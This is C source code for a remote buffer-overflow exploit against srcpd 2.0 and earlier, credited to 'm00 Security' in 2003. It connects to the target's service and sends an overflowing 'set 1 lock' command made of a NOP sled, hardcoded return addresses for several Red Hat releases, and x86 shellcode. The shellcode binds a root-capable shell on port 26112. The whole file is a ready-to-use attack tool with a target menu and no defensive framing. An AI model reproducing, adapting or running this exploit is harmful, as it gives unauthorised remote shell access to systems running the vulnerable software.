/*
 *    m00 Security 
 * www.m00security.org 
 * srcpd  =< 2.0 remote exploit
 * 
 * Audited by h0snp && Over_G.
 * Programmed by h0snp.
 * 2003.
 * ----------
 * Contact: #m00 at irc.wom.ru
 */
 
 
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>

#define SCODELEN	148
#define NOP			0x90
#define RET			0xbf1fcb61






unsigned long int resolve(char *host)
{
	 long i;
	 struct hostent *he;
	 
	 i = inet_addr(host);
	 if (i < 0) 
	 {
	 	he = gethostbyname(host);
	 	if (!he) return (0);
      	 else           return (*(unsigned long *)he->h_addr);      	
  	 }
   	return (i);
}

 
int make_connect(char *address, unsigned short port)
{
	int sock,i;
	struct sockaddr_in peer;
	
	sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock <= 0) return -1;
	
	if (!(i = resolve(address))) return -2; 
		else
		{
			peer.sin_family = AF_INET;
    		peer.sin_addr.s_addr = i;
			peer.sin_port = htons(port);
		}		
	if (!(connect(sock,(struct sockaddr *)&peer,sizeof peer))) return (sock);
		else { close(sock); return -3; }
}

unsigned char scode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x1\x51\xb1\x6\x51\xb1\x1"
"\x51\xb1\x2\x51\x8d\xc\x24\xcd\x80\xb3\x2\xb1\x2\x31\xc9\x51\x51\x51\x80"
"\xc1\x66\x66\x51\xb1\x2\x66\x51\x8d\xc\x24\xb2\x10\x52\x51\x50\x8d\xc\x24"
"\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3\x1\x53\x52\x8d\xc\x24\x31\xc0\xb0\x66"
"\x80\xc3\x3\xcd\x80\x31\xc0\x50\x50\x52\x8d\xc\x24\xb3\x5\xb0\x66\xcd\x80"
"\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x31"
"\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x8"
"\x31\xc9\x51\x53\x8d\xc\x24\x31\xc0\xb0\xb\xcd\x80\x31\xc0\xb0\x01\xcd\x80";


long get_esp(){	__asm__ ("movl %esp,%eax"); }

struct
{
	char* 		 type;
	long  		 ret;
	unsigned int rep;
} targets[]=
{
 {"Red Hat Linux 9.0 x86 srcpd 2.0 (build gcc 3.2.2)",RET,13},
 {"Red Hat Linux 9.0 x86 srcpd 2.0 (from rpm)",0xbf1fcba1,6},
 {"Red Hat Linux 7.3 x86 srcpd 2.0 (from rpm)",0x42931b51,6},
}, dumb;

void usage(char* name)
{
	int i;
	
	printf("\rSrcpd v2.0 remote exploit by m00 Security\n");
	printf("usage: %s -h <host> -p <port> -t <target> [-o <offset>] \n",name);
	printf("avialable targets:\n");
	for (i =0; i< sizeof(targets)/sizeof(dumb); i++)
		printf(" %3d / 0x%.8x / %s \n",i,targets[i].ret,targets[i].type);
	exit(0);
}

 

int main(int argc, char* argv[])
{	
	char* host,*buf,*rcvbuf;
	long  ret = RET/*get_esp()*/,*addr;
	int   rez,port=12340,sock,pos,i,trgt;

	if (argc < 4) usage(argv[0]);
	
	while ((rez = getopt(argc,argv,"h:p:o:t:")) != -1)
		switch (rez)
		{
			case 'h': host = optarg;       break;
			case 'p': port = atoi(optarg); break;
			case 'o': ret -= atol(optarg); break;
			case 't': trgt = atoi(optarg); break;				
			case '?': break;
		}
	printf(" ** ***************************************** **\n"); 		
	printf(" ** Srcpd v2.0 remote exploit by m00 Security **\n");
	printf(" ** ***************************************** **\n");
	printf(" Conneting...");
	if ((sock = make_connect(host,port)) <= 0)
	{
		perror(" connect()");
		exit(-1);		
	}
	ret = targets[trgt].ret;
	printf("OK\n using RET = 0x%x\n",ret);	
	buf    = (char*)malloc(220);
	rcvbuf = (char*)malloc(512);	
	pos = recv(sock,rcvbuf,512,0);	    
	printf(" Sending...");
	if (pos <= 0 || pos == EOF) return -1;	
	send(sock,"go 11111\r\n",10,0);	
	pos = recv(sock,rcvbuf,512,0);	    
	if (pos <= 0 || pos == EOF) return -1;
	memset(buf,NOP,200);
	memcpy(buf,"set 1 lock ",11);
	addr = (long*)(buf+11);
	for (i =0; i< targets[trgt].rep; i++)
		*(addr++) = ret;
	*(addr++) = '\x20';	
	memcpy(buf+targets[trgt].rep*4+12,scode,SCODELEN);
	buf[219] = '\0';
	printf("OK\n");	
	send(sock,buf,220,0);
	printf(" now, if you was lucky with ret, shell spawned on 26112.\n");
	free(buf);
	free(rcvbuf);
	close(sock);
	return 0; 
 }
